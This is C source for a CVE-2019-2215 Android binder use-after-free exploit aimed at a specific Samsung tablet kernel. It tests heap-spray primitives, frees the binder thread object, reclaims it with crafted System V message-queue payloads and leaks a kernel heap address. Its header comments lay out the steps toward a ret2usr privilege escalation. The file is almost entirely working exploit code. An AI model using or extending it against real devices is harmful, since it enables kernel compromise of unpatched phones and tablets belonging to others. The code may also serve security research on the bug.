/*
 * cve_2019_2215_msgmsg.c — CVE-2019-2215 exploit using msg_msg for heap leak
 *
 * APPROACH: Since UIO_FASTIOV=32 blocks the iovec technique on this device,
 * we use msg_msg (System V message queues) for kmalloc-256 reclaim.
 * 
 * Phase 1: Verify primitives
 *   T1: Does msgsnd allocate in kmalloc-256?
 *   T2: Is /proc/self/pagemap readable? (physmap for ret2usr)
 *   T3: Can we trigger the binder UAF + reclaim with msg_msg?
 *   T4: Does close(epfd) give us a kernel heap address in the msg?
 *
 * Phase 2: Full exploit (if T1-T4 succeed)
 *   Step 1: Trigger binder UAF (THREAD_EXIT)
 *   Step 2: Reclaim with msg_msg (payload[20]=0 for spinlock)
 *   Step 3: close(epfd) → list_del writes heap address into msg_msg
 *   Step 4: msgrcv reads back corrupted msg_msg → kernel heap address leak
 *
 * Device: SM-T377A, kernel 3.10.9, ARM32, no KASLR, no PXN
 * Known: binder_thread in kmalloc-256, wait_queue at offset ~44
 *
 * Build: .\qemu\build-arm.bat src\cve_2019_2215_msgmsg.c cve_2019_2215_msgmsg
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/epoll.h>
#include <sys/ioctl.h>
#include <sys/ipc.h>
#include <sys/mman.h>
#include <sys/msg.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <unistd.h>

/* Binder ioctls */
#define BINDER_WRITE_READ       _IOWR('b', 1, struct binder_write_read)
#define BINDER_SET_MAX_THREADS  _IOW('b', 5, uint32_t)
#define BINDER_THREAD_EXIT      _IOW('b', 8, int)
#define BINDER_VERSION          _IOWR('b', 9, int)

/* Binder commands */
#define BC_ENTER_LOOPER         0x630c

struct binder_write_read {
    signed long write_size, write_consumed;
    unsigned long write_buffer;
    signed long read_size, read_consumed;
    unsigned long read_buffer;
};

/* binder_thread layout on ARM32 (from disassembly):
 * +0:  proc (4)
 * +4:  rb_node (12)
 * +16: pid (4)
 * +20: looper (4)
 * +24: transaction_stack (4)
 * +28: todo (list_head, 8)
 * +36: return_error (4)
 * +40: return_error2 (4)
 * +44: wait.lock (spinlock, 4) ← MUST BE 0 FOR SPIN_LOCK!
 * +48: wait.task_list.next (4) ← list_del writes here
 * +52: wait.task_list.prev (4) ← list_del writes here
 * +56: stats (variable)
 */
#define BT_WAIT_LOCK_OFF    44
#define BT_WAIT_NEXT_OFF    48
#define BT_WAIT_PREV_OFF    52

/* msg_msg layout on ARM32:
 * +0:  m_list.next (4)
 * +4:  m_list.prev (4)
 * +8:  m_type (4)
 * +12: m_ts (4)
 * +16: next (4) -- segment pointer
 * +20: security (4)
 * +24: payload starts
 * 
 * For kmalloc-256: payload can be up to 232 bytes (256 - 24)
 * The wait_queue at binder_thread+44 corresponds to msg_msg+44 = payload[20]
 * The list_del targets at +48, +52 correspond to payload[24..31]
 */
#define MSG_HDR_SIZE        24
#define PAYLOAD_OFF_LOCK    (BT_WAIT_LOCK_OFF - MSG_HDR_SIZE)  /* 20 */
#define PAYLOAD_OFF_NEXT    (BT_WAIT_NEXT_OFF - MSG_HDR_SIZE)  /* 24 */
#define PAYLOAD_OFF_PREV    (BT_WAIT_PREV_OFF - MSG_HDR_SIZE)  /* 28 */

/* Message buffer for msgsnd/msgrcv */
struct msgbuf_256 {
    long mtype;
    char mtext[200]; /* 200 payload + 24 header = 224 → kmalloc-256 */
};

static void hexdump(const char *prefix, const uint8_t *data, int len) {
    printf("  %s: ", prefix);
    for (int i = 0; i < len; i++) {
        printf("%02x", data[i]);
        if ((i % 4) == 3) printf(" ");
    }
    printf("\n");
}

/* ========== T1: Verify msg_msg lands in kmalloc-256 ========== */
static void test1_msgmsg_slab(void) {
    printf("\n=== T1: Verify msg_msg slab allocation ===\n");
    fflush(stdout);

    /* Read baseline kmalloc-256 */
    FILE *f = fopen("/proc/slabinfo", "r");
    if (!f) { printf("  SKIP: can't read /proc/slabinfo\n"); return; }
    
    char line[512];
    long k256_before = -1;
    while (fgets(line, sizeof(line), f)) {
        if (strncmp(line, "kmalloc-256 ", 12) == 0) {
            /* Format: name <active_objs> <num_objs> ... */
            long active;
            sscanf(line + 12, "%ld", &active);
            k256_before = active;
            break;
        }
    }
    fclose(f);
    
    if (k256_before < 0) {
        printf("  SKIP: kmalloc-256 not found in slabinfo\n");
        return;
    }
    printf("  kmalloc-256 before: %ld active objects\n", k256_before);
    
    /* Allocate 100 messages */
    int qid = msgget(IPC_PRIVATE, IPC_CREAT | 0600);
    if (qid < 0) { perror("  msgget"); return; }
    
    struct msgbuf_256 msg;
    msg.mtype = 1;
    memset(msg.mtext, 'A', sizeof(msg.mtext));
    
    int sent = 0;
    for (int i = 0; i < 100; i++) {
        msg.mtype = i + 1;
        if (msgsnd(qid, &msg, sizeof(msg.mtext), IPC_NOWAIT) == 0)
            sent++;
        else
            break;
    }
    
    /* Re-read kmalloc-256 */
    f = fopen("/proc/slabinfo", "r");
    long k256_after = -1;
    while (fgets(line, sizeof(line), f)) {
        if (strncmp(line, "kmalloc-256 ", 12) == 0) {
            long active;
            sscanf(line + 12, "%ld", &active);
            k256_after = active;
            break;
        }
    }
    fclose(f);
    
    long delta = k256_after - k256_before;
    printf("  Sent %d messages (payload=%zu bytes)\n", sent, sizeof(msg.mtext));
    printf("  kmalloc-256 after: %ld (+%ld = %.1f per msg)\n",
           k256_after, delta, sent > 0 ? (double)delta / sent : 0);
    
    if (delta > sent / 2) {
        printf("  ✓ CONFIRMED: msg_msg allocates in kmalloc-256\n");
    } else {
        printf("  ✗ msg_msg does NOT allocate in kmalloc-256 (wrong size?)\n");
        /* Try different payload sizes */
        msgctl(qid, IPC_RMID, NULL);
        
        int sizes[] = { 100, 150, 169, 180, 200, 220, 232, 0 };
        for (int s = 0; sizes[s]; s++) {
            qid = msgget(IPC_PRIVATE, IPC_CREAT | 0600);
            f = fopen("/proc/slabinfo", "r");
            while (fgets(line, sizeof(line), f))
                if (strncmp(line, "kmalloc-256 ", 12) == 0)
                    sscanf(line + 12, "%ld", &k256_before);
            fclose(f);
            
            char *buf = malloc(sizeof(long) + sizes[s]);
            *(long*)buf = 1;
            memset(buf + sizeof(long), 'B', sizes[s]);
            
            for (int i = 0; i < 50; i++) {
                *(long*)buf = i + 1;
                msgsnd(qid, buf, sizes[s], IPC_NOWAIT);
            }
            
            f = fopen("/proc/slabinfo", "r");
            while (fgets(line, sizeof(line), f))
                if (strncmp(line, "kmalloc-256 ", 12) == 0)
                    sscanf(line + 12, "%ld", &k256_after);
            fclose(f);
            
            printf("    payload=%d: k256 delta=%+ld\n", sizes[s], k256_after - k256_before);
            msgctl(qid, IPC_RMID, NULL);
            free(buf);
        }
        return;
    }
    
    /* Cleanup */
    msgctl(qid, IPC_RMID, NULL);
}

/* ========== T2: Check /proc/self/pagemap readability ========== */
static void test2_pagemap(void) {
    printf("\n=== T2: /proc/self/pagemap check ===\n");
    fflush(stdout);
    
    int fd = open("/proc/self/pagemap", O_RDONLY);
    if (fd < 0) {
        printf("  open: errno=%d (%s)\n", errno, strerror(errno));
        printf("  ✗ pagemap NOT accessible\n");
        return;
    }
    
    /* Allocate a test page */
    void *page = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                       MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (page == MAP_FAILED) { close(fd); return; }
    
    /* Touch to ensure physical page is allocated */
    memset(page, 0x41, 4096);
    
    /* Read pagemap entry */
    unsigned long vpn = (unsigned long)page / 4096;
    off_t offset = vpn * 8;
    
    uint64_t entry = 0;
    if (pread(fd, &entry, 8, offset) != 8) {
        printf("  pread: errno=%d (%s)\n", errno, strerror(errno));
        printf("  ✗ pagemap read failed\n");
        close(fd);
        munmap(page, 4096);
        return;
    }
    
    printf("  pagemap entry: 0x%016llx\n", (unsigned long long)entry);
    
    if (entry & (1ULL << 63)) {
        /* Page present */
        uint64_t pfn = entry & ((1ULL << 55) - 1);
        unsigned long phys = pfn * 4096;
        unsigned long kern_va = 0xC0000000 + phys; /* ARM32 lowmem direct map */
        
        printf("  PFN: 0x%llx, phys: 0x%lx\n",
               (unsigned long long)pfn, phys);
        printf("  kernel VA (direct map): 0x%lx\n", kern_va);
        printf("  ✓ PAGEMAP READABLE! User data at known kernel address!\n");
        printf("  This enables ret2usr via physmap.\n");
    } else {
        printf("  Page not present (PFN hidden?)\n");
        if (entry == 0)
            printf("  ✗ Entry is all zeros — kptr_restrict blocks PFN\n");
    }
    
    close(fd);
    munmap(page, 4096);
}

/* ========== T3: Trigger binder UAF + msg_msg reclaim ========== */
static void test3_uaf_reclaim(void) {
    printf("\n=== T3: Binder UAF + msg_msg reclaim ===\n");
    fflush(stdout);
    
    /* Step 1: Open binder */
    int binder_fd = open("/dev/binder", O_RDWR | O_CLOEXEC);
    if (binder_fd < 0) { perror("  open binder"); return; }
    
    uint32_t max = 0;
    ioctl(binder_fd, BINDER_SET_MAX_THREADS, &max);
    
    /* Step 2: Enter looper to create binder_thread */
    uint32_t cmd = BC_ENTER_LOOPER;
    struct binder_write_read bwr;
    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(cmd);
    bwr.write_buffer = (unsigned long)&cmd;
    ioctl(binder_fd, BINDER_WRITE_READ, &bwr);
    printf("  Entered binder looper\n");
    
    /* Step 3: Add binder_fd to epoll → links wait entry to binder_thread->wait */
    int epfd = epoll_create1(O_CLOEXEC);
    if (epfd < 0) { perror("  epoll_create1"); close(binder_fd); return; }
    
    struct epoll_event ev = { .events = EPOLLIN };
    if (epoll_ctl(epfd, EPOLL_CTL_ADD, binder_fd, &ev) < 0) {
        perror("  epoll_ctl ADD");
        close(epfd); close(binder_fd);
        return;
    }
    printf("  Added binder_fd to epoll → wait entry linked\n");
    
    /* Step 4: Create message queue */
    int qid = msgget(IPC_PRIVATE, IPC_CREAT | 0600);
    if (qid < 0) { perror("  msgget"); return; }
    
    /* Step 5: BINDER_THREAD_EXIT → frees binder_thread (kmalloc-256 UAF!) */
    int thr = 0;
    ioctl(binder_fd, BINDER_THREAD_EXIT, &thr);
    printf("  BINDER_THREAD_EXIT → binder_thread freed (UAF!)\n");
    
    /* Step 6: Immediately reclaim with msg_msg */
    /* Craft payload: byte at offset 20 (spinlock in binder_thread+44) must be 0 */
    struct msgbuf_256 msg;
    msg.mtype = 1;
    memset(msg.mtext, 'X', sizeof(msg.mtext));
    
    /* Ensure spinlock byte is 0 */
    msg.mtext[PAYLOAD_OFF_LOCK] = 0;
    msg.mtext[PAYLOAD_OFF_LOCK + 1] = 0;
    msg.mtext[PAYLOAD_OFF_LOCK + 2] = 0;
    msg.mtext[PAYLOAD_OFF_LOCK + 3] = 0;
    
    /* Mark the list entries with a known pattern so we can detect overwrite */
    msg.mtext[PAYLOAD_OFF_NEXT + 0] = 0xDE;
    msg.mtext[PAYLOAD_OFF_NEXT + 1] = 0xAD;
    msg.mtext[PAYLOAD_OFF_NEXT + 2] = 0xBE;
    msg.mtext[PAYLOAD_OFF_NEXT + 3] = 0xEF;
    msg.mtext[PAYLOAD_OFF_PREV + 0] = 0xCA;
    msg.mtext[PAYLOAD_OFF_PREV + 1] = 0xFE;
    msg.mtext[PAYLOAD_OFF_PREV + 2] = 0xBA;
    msg.mtext[PAYLOAD_OFF_PREV + 3] = 0xBE;
    
    /* Send many messages to increase chance of reclaiming the freed slot */
    int reclaimed = 0;
    for (int i = 0; i < 128; i++) {
        msg.mtype = i + 1;
        if (msgsnd(qid, &msg, sizeof(msg.mtext), IPC_NOWAIT) == 0)
            reclaimed++;
    }
    printf("  Sent %d msg_msg for reclaim\n", reclaimed);
    
    /* Step 7: close(epfd) → triggers remove_wait_queue on freed/reclaimed memory */
    printf("  Closing epfd → triggers list_del on reclaimed memory...\n");
    fflush(stdout);
    close(epfd);
    printf("  close(epfd) completed (no crash!)\n");
    
    /* Step 8: Read back messages, check for corruption at the wait queue offset */
    printf("  Reading back messages to check for kernel address leak...\n");
    int leaked = 0;
    uint32_t leaked_addr = 0;
    
    for (int i = 0; i < reclaimed; i++) {
        struct msgbuf_256 rbuf;
        memset(&rbuf, 0, sizeof(rbuf));
        if (msgrcv(qid, &rbuf, sizeof(rbuf.mtext), 0, IPC_NOWAIT | MSG_NOERROR) < 0)
            break;
        
        /* Check if the pattern at the wait queue offset was overwritten */
        uint32_t val_next = *(uint32_t*)(rbuf.mtext + PAYLOAD_OFF_NEXT);
        uint32_t val_prev = *(uint32_t*)(rbuf.mtext + PAYLOAD_OFF_PREV);
        
        if (val_next != 0xEFBEADDE) { /* != our pattern (little-endian) */
            printf("  MSG %ld: OVERWRITTEN!\n", rbuf.mtype);
            printf("    offset %d (next): 0x%08x (was 0xDEADBEEF)\n",
                   PAYLOAD_OFF_NEXT, val_next);
            printf("    offset %d (prev): 0x%08x (was 0xCAFEBABE)\n",
                   PAYLOAD_OFF_PREV, val_prev);
            hexdump("bytes 16-36", (uint8_t*)rbuf.mtext + 16, 20);
            
            if (val_next >= 0xC0000000 && val_next < 0xD0000000) {
                printf("    ✓ KERNEL HEAP ADDRESS LEAKED: 0x%08x\n", val_next);
                printf("    Object base ≈ 0x%08x (addr - %d)\n",
                       val_next - BT_WAIT_NEXT_OFF, BT_WAIT_NEXT_OFF);
                leaked = 1;
                leaked_addr = val_next;
            }
        }
    }
    
    if (!leaked)
        printf("  No corruption detected — reclaim may have missed\n");
    
    /* Cleanup */
    msgctl(qid, IPC_RMID, NULL);
    close(binder_fd);
}

/* ========== MAIN ========== */

static void sighandler(int sig) {
    printf("*** SIGNAL %d ***\n", sig);
    fflush(stdout);
    _exit(128 + sig);
}

int main(void) {
    printf("=== CVE-2019-2215 + msg_msg Exploit ===\n");
    printf("SM-T377A, kernel 3.10.9, PID=%d UID=%d\n\n", getpid(), getuid());
    fflush(stdout);
    
    signal(SIGSEGV, sighandler);
    signal(SIGBUS, sighandler);
    
    /* T1: Verify msg_msg slab */
    pid_t pid = fork();
    if (pid == 0) { alarm(15); test1_msgmsg_slab(); _exit(0); }
    int status;
    waitpid(pid, &status, 0);
    if (WIFSIGNALED(status)) printf("T1 CRASHED sig=%d\n", WTERMSIG(status));
    
    /* T2: Check pagemap */
    pid = fork();
    if (pid == 0) { alarm(5); test2_pagemap(); _exit(0); }
    waitpid(pid, &status, 0);
    if (WIFSIGNALED(status)) printf("T2 CRASHED sig=%d\n", WTERMSIG(status));
    
    /* T3: Binder UAF + msg_msg reclaim */
    pid = fork();
    if (pid == 0) { alarm(15); test3_uaf_reclaim(); _exit(0); }
    waitpid(pid, &status, 0);
    if (WIFSIGNALED(status)) printf("T3 CRASHED sig=%d\n", WTERMSIG(status));
    
    printf("\n=== Done ===\n");
    return 0;
}
